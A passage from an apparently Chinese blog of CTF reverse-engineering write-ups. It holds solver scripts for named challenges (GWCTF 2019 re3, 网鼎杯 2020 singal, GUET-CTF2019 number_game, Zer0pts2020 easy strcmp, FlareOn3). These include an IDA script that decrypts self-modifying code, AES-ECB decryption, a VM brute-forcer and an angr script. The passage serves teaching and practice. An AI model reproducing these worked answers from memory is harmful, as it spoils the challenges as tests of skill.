class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> maze]</span><br><span class="line">maze = [i <span class="keyword">if</span> i !=<span class="number">0</span> <span class="keyword">else</span> <span class="built_in">ord</span>(<span class="string">&#x27;*&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> maze]</span><br><span class="line">maze = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, maze))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(maze), <span class="number">16</span>):</span><br><span class="line"><span class="built_in">print</span> maze[i:i+<span class="number">16</span>]</span><br></pre></td></tr></table></figure><p>找到路径（假设 上 - U，下 - D，左 - L，右 - R）：</p><p><img src="../img/ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020Oruga/2.png" alt="MRCTF2020hello_world_go"></p><p>替换成题目中用到的控制方向的四个字符：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">path = <span class="string">&quot;DRURDRULDRULD&quot;</span></span><br><span class="line">path = path.replace(<span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;M&#x27;</span>)</span><br><span class="line">path = path.replace(<span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;W&#x27;</span>)</span><br><span class="line">path = path.replace(<span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;J&#x27;</span>)</span><br><span class="line">path = path.replace(<span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;E&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> path</span><br></pre></td></tr></table></figure><br><h3 id="GWCTF-2019-re3-x86-elf-SMC-md5-AES-ECB"><a href="#GWCTF-2019-re3-x86-elf-SMC-md5-AES-ECB" class="headerlink" title="[GWCTF 2019]re3 | x86,elf,SMC,md5,AES_ECB"></a>[GWCTF 2019]re3 | x86,elf,SMC,md5,AES_ECB</h3><p>main 函数：</p><p><img src="../img/GWCTF2019re3/1.png" alt="GWCTF2019re3"></p><p>for 循环表示只有在运行的时候才会解密 sub_402219 函数（该函数逐字节异或 0x99），写个 python 的 idc 脚本直接还原该函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line">funcAddr = <span class="number">0x402219</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">224</span>):</span><br><span class="line">enc = get_bytes(funcAddr + i, <span class="number">1</span>)</span><br><span class="line">dec = <span class="built_in">ord</span>(enc) ^ <span class="number">0x99</span></span><br><span class="line">patch_byte(funcAddr + i, dec)</span><br></pre></td></tr></table></figure><p>在 ida 中选择 File -&gt; Script File…，选择该脚本即可运行。来到地址 0x402219 处，光标放在 sub_402219 标签上，按 U 取消函数定义，再按 C 数据转汇编代码，最后按 P 创建函数，F5 反编译：</p><p><img src="../img/GWCTF2019re3/2.png" alt="GWCTF2019re3"></p><p>至于为什么知道那个函数是 AES 加密，ida 有个插件叫 findcrypto 谁用谁知道，安装方式请自行百度。常用加密模式一般就 CBC/ECB，CBC 模式需要 iv，这里就俩参数，一个 key， 一个待加密明文，所以加密模式就是 ECB 咯。key 由 sub_40207B 函数准备，可以直接 gdb 动调从内存中拿出来。下面是解密脚本（python3）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">text</span>):</span></span><br><span class="line">key = <span class="string">&quot;cb 8d 49 35 21 b4 7a 4c c1 ae 7e 62 22 92 66 ce&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">key = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line">key = <span class="built_in">bytes</span>(key)</span><br><span class="line"></span><br><span class="line">mode = AES.MODE_ECB</span><br><span class="line">cryptor = AES.new(key, mode)</span><br><span class="line">plain_text = cryptor.decrypt(a2b_hex(text))</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">bytes</span>.decode(plain_text).rstrip(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">raw = <span class="string">&quot;BC 0A AD C0 14 7C 5E CC E0 B1 40 BC 9C 51 D5 2B 46 B2 B9 43 4D E5 32 4B AD 7F B4 B3 9C DB 4B 5B&quot;</span></span><br><span class="line">target = raw.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">piece1 = target[:<span class="number">32</span>]</span><br><span class="line">piece2 = target[<span class="number">32</span>:]</span><br><span class="line"><span class="built_in">print</span>(decrypt(piece1) + decrypt(piece2))</span><br></pre></td></tr></table></figure><br><h3 id="网鼎杯-2020-青龙组-singal-x86-exe-vm虚拟机-angr"><a href="#网鼎杯-2020-青龙组-singal-x86-exe-vm虚拟机-angr" class="headerlink" title="[网鼎杯 2020 青龙组]singal | x86,exe,vm虚拟机,angr"></a>[网鼎杯 2020 青龙组]singal | x86,exe,vm虚拟机,angr</h3><p>打开 vm_operad 函数，看样子出题人写了个超小型虚拟机：</p><p><img src="../img/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84singal/1.png" alt="网鼎杯2020青龙组singal"></p><p>三种方法</p><p>第一种 —— code 也不多，手动跟踪每一次 switch，得到 flag 每一位的计算方式，再写脚本逆回去</p><p>第二种 —— 稍微分析一下得知 case 1 赋值 mem 数组，case 7 拿 mem 与 target 进行比较，把 vm_operad 从 ida 摘下来，用 VS 改亿小点，写个程序爆破 flag（或者逆着 code 回去，从 target 反推输入）。爆破的脚本我贴这儿了：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vcruntime_string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable : 4996)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> code[<span class="number">0x1C8</span> / <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>)];</span><br><span class="line"><span class="keyword">char</span> target[<span class="number">15</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> mem[<span class="number">100</span>]; <span class="comment">// [esp-85h] [ebp-85h]</span></span><br><span class="line"><span class="keyword">char</span> reg; <span class="comment">// [esp-21h] [ebp-21h]</span></span><br><span class="line"><span class="keyword">int</span> dsp2; <span class="comment">// [esp-20h] [ebp-20h]</span></span><br><span class="line"><span class="keyword">int</span> tIdx; <span class="comment">// [esp-1Ch] [ebp-1Ch]</span></span><br><span class="line"><span class="keyword">int</span> idx; <span class="comment">// [esp-18h] [ebp-18h]</span></span><br><span class="line"><span class="keyword">int</span> dsp1; <span class="comment">// [esp-14h] [ebp-14h]</span></span><br><span class="line"><span class="keyword">int</span> ip; <span class="comment">// [esp-10h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> mem_bak[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> reg_bak;</span><br><span class="line"><span class="keyword">int</span> dsp2_bak;</span><br><span class="line"><span class="keyword">int</span> tIdx_bak;</span><br><span class="line"><span class="keyword">int</span> idx_bak;</span><br><span class="line"><span class="keyword">int</span> dsp1_bak;</span><br><span class="line"><span class="keyword">int</span> ip_bak;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化虚拟机环境</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">env_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 初始化代码段</span></span><br><span class="line">    <span class="comment">// memdump 文件内容为 0x403040 开始的 0x1C8 个字节</span></span><br><span class="line">    FILE* fp = <span class="built_in">fopen</span>(<span class="string">&quot;C:\\memdump&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error memdump file path.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fread</span>(code, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>), <span class="built_in"><span class="keyword">sizeof</span></span>(code) / <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>), fp);</span><br><span class="line">    <span class="built_in">fclose</span>(fp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化内存及各寄存器</span></span><br><span class="line">    <span class="built_in">memset</span>(mem, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(mem));</span><br><span class="line">    reg = <span class="number">0</span>;</span><br><span class="line">    ip = <span class="number">0</span>;</span><br><span class="line">    dsp1 = <span class="number">0</span>;</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">    tIdx = <span class="number">0</span>;</span><br><span class="line">    dsp2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化target数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">15</span>; i++) &#123;</span><br><span class="line">        target[i] = (<span class="keyword">char</span>)code[<span class="number">0x154</span> / <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>) + <span class="number">2</span> * i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拍摄快照</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_vm_state</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(mem_bak, mem, <span class="built_in"><span class="keyword">sizeof</span></span>(mem));</span><br><span class="line">    reg_bak = reg;</span><br><span class="line">    dsp2_bak = dsp2;</span><br><span class="line">    tIdx_bak = tIdx;</span><br><span class="line">    idx_bak = idx;</span><br><span class="line">    dsp1_bak = dsp1;</span><br><span class="line">    ip_bak = ip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 快照还原</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">recover_vm_state</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(mem, mem_bak, <span class="built_in"><span class="keyword">sizeof</span></span>(mem));</span><br><span class="line">    reg = reg_bak;</span><br><span class="line">    dsp2 = dsp2_bak;</span><br><span class="line">    tIdx = tIdx_bak;</span><br><span class="line">    idx = idx_bak;</span><br><span class="line">    dsp1 = dsp1_bak;</span><br><span class="line">    ip = ip_bak;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 虚拟机运行函数</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">vm_operate</span><span class="params">(<span class="keyword">int</span> cur, <span class="keyword">char</span>* input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span> (code[ip])</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> (cur == tIdx) &#123;</span><br><span class="line">                <span class="keyword">return</span> reg == target[cur];</span><br><span class="line">            &#125;</span><br><span class="line">            ++ip;</span><br><span class="line">            ++tIdx;</span><br><span class="line">            ++dsp1;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            reg = (<span class="keyword">char</span>)(code[ip + <span class="number">1</span>]) + input[dsp1];</span><br><span class="line">            ip += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            reg = input[dsp1] - (<span class="keyword">char</span>)(code[ip + <span class="number">1</span>]);</span><br><span class="line">            ip += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            reg = code[ip + <span class="number">1</span>] ^ input[dsp1];</span><br><span class="line">            ip += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            reg = code[ip + <span class="number">1</span>] * input[dsp1];</span><br><span class="line">            ip += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            ++ip;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            <span class="comment">// 原为比较加密结果与target</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            input[dsp2] = reg;</span><br><span class="line">            ++ip;</span><br><span class="line">            ++dsp2;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">            <span class="comment">// 原为接收长度为15的输入</span></span><br><span class="line">            ++ip;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">            reg = input[dsp1] - <span class="number">1</span>;</span><br><span class="line">            ++ip;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">            reg = input[dsp1] + <span class="number">1</span>;</span><br><span class="line">            ++ip;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">env_init</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">15</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// 创建快照</span></span><br><span class="line">        <span class="built_in">save_vm_state</span>();</span><br><span class="line">        <span class="comment">// 所有可见字符</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">33</span>; j &lt; <span class="number">128</span>; j++) &#123;</span><br><span class="line">            flag[i] = j;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">vm_operate</span>(i, flag)) &#123;</span><br><span class="line">                <span class="comment">// flag[i]中途可能会被case 8修改，这里再赋值一次</span></span><br><span class="line">                flag[i] = j;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 本次猜测不正确，还原现场</span></span><br><span class="line">            <span class="built_in">recover_vm_state</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    flag[<span class="number">15</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出前两种方法非常不方便，都需要认真分析每个 opcode 对应干了什么事，边调边写，一血早没了。有没有无脑冲冲冲的方法呢？下面有请第三种方法 —— <strong>angr 符号执行</strong> 隆重登场</p><p>经过几个版本的更新，angr 的 API 现在用起来非常方便，不了解的可以阅读 <a href="https://xz.aliyun.com/t/3990">系列文章</a>，这里直接贴脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">project = angr.Project(<span class="string">&quot;./signal.exe&quot;</span>, auto_load_libs = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@project.hook(<span class="params"><span class="number">0x40179E</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MyHook</span>(<span class="params">state</span>):</span></span><br><span class="line"><span class="built_in">print</span>(state.posix.dumps(<span class="number">0</span>))</span><br><span class="line">project.terminate_execution()</span><br><span class="line"></span><br><span class="line">project.execute()</span><br></pre></td></tr></table></figure><p>运行截图：</p><p><img src="../img/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84singal/2.png" alt="网鼎杯2020青龙组singal"></p><p>什么叫秒解？</p><br><h3 id="GUET-CTF2019-number-game-x86-elf-二叉树-数独"><a href="#GUET-CTF2019-number-game-x86-elf-二叉树-数独" class="headerlink" title="[GUET-CTF2019]number_game | x86,elf,二叉树,数独"></a>[GUET-CTF2019]number_game | x86,elf,二叉树,数独</h3><p>根据函数行为还原 main 逻辑：</p><p><img src="../img/GUETCTF2019number_game/1.png" alt="GUETCTF2019number_game"></p><p>结点的结构体经分析后有：<br><img src="../img/GUETCTF2019number_game/2.png" alt="GUETCTF2019number_game"></p><p>Preorder_builder 函数：</p><p><img src="../img/GUETCTF2019number_game/3.png" alt="GUETCTF2019number_game"></p><p>Inorder 中序遍历函数：</p><p><img src="../img/GUETCTF2019number_game/4.png" alt="GUETCTF2019number_game"></p><p>CheckSudoku 函数检查是否满足数独游戏的要求：</p><p><img src="../img/GUETCTF2019number_game/5.png" alt="GUETCTF2019number_game"></p><p>把数独拿出来看看：</p><p><img src="../img/GUETCTF2019number_game/6.png" alt="GUETCTF2019number_game"></p><p>顺便手解了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(0, 2) = 0</span><br><span class="line">(1, 2) = 4</span><br><span class="line">(1, 4) = 2</span><br><span class="line">(2, 1) = 1</span><br><span class="line">(2, 4) = 4</span><br><span class="line">(3, 0) = 2</span><br><span class="line">(3, 2) = 1</span><br><span class="line">(3, 3) = 4</span><br><span class="line">(4, 2) = 3</span><br><span class="line">(4, 3) = 0</span><br></pre></td></tr></table></figure><p>FillSudoku 函数在填写数独的时候使用的就是中序遍历得到的数组下标序列：</p><p><img src="../img/GUETCTF2019number_game/7.png" alt="GUETCTF2019number_game"></p><p>理解了原理可以照着写个前序、中序来获得填入数独时数组下标的映射序列。我偷懒直接把 CheckValid 函数 patch 掉，然后输个 ABCDEFGHIJ，动态调试看看被映射到哪里去了，得到被填写后的数独为 14H2330D1I0B23JE3AF042CG1，故有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(0, 2) = 0 -&gt; H</span><br><span class="line">(1, 2) = 4 -&gt; D</span><br><span class="line">(1, 4) = 2 -&gt; I</span><br><span class="line">(2, 1) = 1 -&gt; B</span><br><span class="line">(2, 4) = 4 -&gt; J</span><br><span class="line">(3, 0) = 2 -&gt; E</span><br><span class="line">(3, 2) = 1 -&gt; A</span><br><span class="line">(3, 3) = 4 -&gt; F</span><br><span class="line">(4, 2) = 3 -&gt; C</span><br><span class="line">(4, 3) = 0 -&gt; G</span><br></pre></td></tr></table></figure><p>按照 A-J 的顺序组织好输入就是 flag 了</p><br><h3 id="Zer0pts2020-easy-strcmp-x86-elf-elf运行流程"><a href="#Zer0pts2020-easy-strcmp-x86-elf-elf运行流程" class="headerlink" title="[Zer0pts2020]easy strcmp | x86,elf,elf运行流程"></a>[Zer0pts2020]easy strcmp | x86,elf,elf运行流程</h3><p>main 函数简单地通过 strcmp 来判断输入，那肯定没这么简单。直接找 init_array，发现可疑函数 sub_795：</p><p> <img src="../img/Zer0pts2020easystrcmp/1.png" alt="Zer0pts2020easystrcmp"></p><p>该函数将 strcmp 的 plt 表项替换为虚假的 strcmp，main 函数调用 strcmp 时控制流会来到 FakeStrcmp：<br><img src="../img/Zer0pts2020easystrcmp/2.png" alt="Zer0pts2020easystrcmp"></p><p>FakeStrcmp 首先对输入进行变换，再调用 RealStrcmp：</p><p><img src="../img/Zer0pts2020easystrcmp/3.png" alt="Zer0pts2020easystrcmp"></p><p>脚本还原时需要注意小端序的问题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="string">&quot;zer0pts&#123;********CENSORED********&#125;&quot;</span></span><br><span class="line">target = <span class="built_in">map</span>(<span class="built_in">ord</span>, target)</span><br><span class="line"></span><br><span class="line">nums = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(target), <span class="number">8</span>):</span><br><span class="line">tmp = target[i:i+<span class="number">8</span>]</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">num += tmp[j] &lt;&lt; j * <span class="number">8</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">nums.append(num)</span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line">qword_201060 = [<span class="number">0</span>, <span class="number">0x410A4335494A0942</span>, <span class="number">0xB0EF2F50BE619F0</span>, <span class="number">0x4F0A3A064A35282B</span>, <span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">res.append(qword_201060[i] + nums[i])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">tmp = <span class="string">&quot;%016X&quot;</span> % res[i]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>, -<span class="number">1</span>, -<span class="number">2</span>):</span><br><span class="line">flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(tmp[j:j+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span> flag.strip(<span class="string">&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><br><h3 id="FlareOn3-Challenge1-x86-exe-变种base64"><a href="#FlareOn3-Challenge1-x86-exe-变种base64" class="headerlink" title="[FlareOn3]Challenge1 | x86,exe,变种base64"></a>[FlareOn3]Challenge1 | x86,exe,变种base64</h3><p>main 函数逻辑清晰：</p><p><img src="../img/FlareOn3Challenge1/1.png" alt="FlareOn3Challenge1"></p><p>不过 base64 编码表被替换，还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">ori = <span class="string">&#x27;&#x27;</span></span><br><span class="line">target = <span class="string">&quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&quot;</span></span><br><span class="line"></span><br><span class="line">oldTable = <span 